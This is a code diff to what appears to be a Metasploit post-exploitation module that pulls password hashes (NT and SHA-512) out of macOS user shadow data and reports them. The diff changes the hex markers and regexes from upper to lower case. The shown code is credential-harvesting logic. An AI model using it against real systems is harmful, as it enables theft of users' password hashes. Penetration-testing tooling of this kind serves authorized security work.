@@ -76,15 +76,15 @@ class Metasploit3 < Msf::Post
         next if shadow_bytes.blank?
 
         # on 10.7 the ShadowHashData is stored in plaintext
-        hash_decoded = shadow_bytes.upcase
+        hash_decoded = shadow_bytes.downcase
 
         # Check if NT HASH is present
-        if hash_decoded =~ /4F1010/
-          report_hash("NT", hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0], user)
+        if hash_decoded =~ /4f1010/
+          report_hash("NT", hash_decoded.scan(/^\w*4f1010(\w*)4f1044/)[0][0], user)
         end
 
         # slice out the sha512 hash + salt
-        sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
+        sha512 = hash_decoded.scan(/^\w*4f1044(\w*)(080b190|080d101e31)/)[0][0]
         report_hash("SHA-512", sha512, user)
       else # 10.6 and below
         # On 10.6 and below, SHA-1 is used for encryption
@@ -168,7 +168,7 @@ class Metasploit3 < Msf::Post
     print_status("#{type}:#{user}:#{hash}")
     case type
     when "NT", "LM"
-      private_data = type == "NT" ? "AAD3B435B51404EE:#{hash}" : "#{hash}:"
+      private_data = type == "NT" ? "aad3b435b51404ee:#{hash}" : "#{hash}:"
       private_type = :ntlm_hash
     when "SHA-512 PBKDF2", "SHA-512", "SHA-1"
       private_data = hash
